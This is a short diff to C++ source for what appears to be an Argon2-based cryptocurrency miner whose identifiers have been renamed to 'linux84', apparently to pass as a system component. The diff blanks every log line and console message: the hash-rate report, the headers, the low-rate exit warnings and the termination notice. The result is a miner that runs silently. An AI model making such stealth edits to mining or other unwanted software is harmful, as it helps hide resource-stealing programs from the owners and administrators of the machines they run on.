@@ -319,13 +319,13 @@ bool linux84::__display_report() {
         string separator(header_str.size(), '-');
 
         if(__display_hits > 0)
-            LOG(separator);
+            LOG("");
 
-        LOG(header_str);
-        LOG(separator);
+        LOG("");
+        LOG("");
     }
 
-    LOG(log.str());
+    LOG("");
 
 /*    if(!__args.is_verbose()) {
         for (vector<linux8474 *>::iterator it = linux8474s.begin(); it != linux8474s.end(); ++it) {
@@ -398,11 +398,11 @@ bool linux84::__display_report() {
     }
 
     if(__chs_threshold_hit >= 5 && (__blocks_count > 1 || __argon2profile == "1_1_524288")) {
-        LOG("CBlocks linux8412rate is lower than requested threshold, exiting.");
+        LOG("");
         exit(0);
     }
     if(__ghs_threshold_hit >= 5 && (__blocks_count > 1 || __argon2profile == "4_4_16384")) {
-        LOG("GBlocks linux8412rate is lower than requested threshold, exiting.");
+        LOG("");
         exit(0);
     }
 
@@ -413,7 +413,7 @@ bool linux84::__display_report() {
 }
 
 void linux84::stop() {
-    cout << endl << "Received termination request, please wait for cleanup ... " << endl;
+    cout << endl << "" << endl;
     __running = false;
 }
 
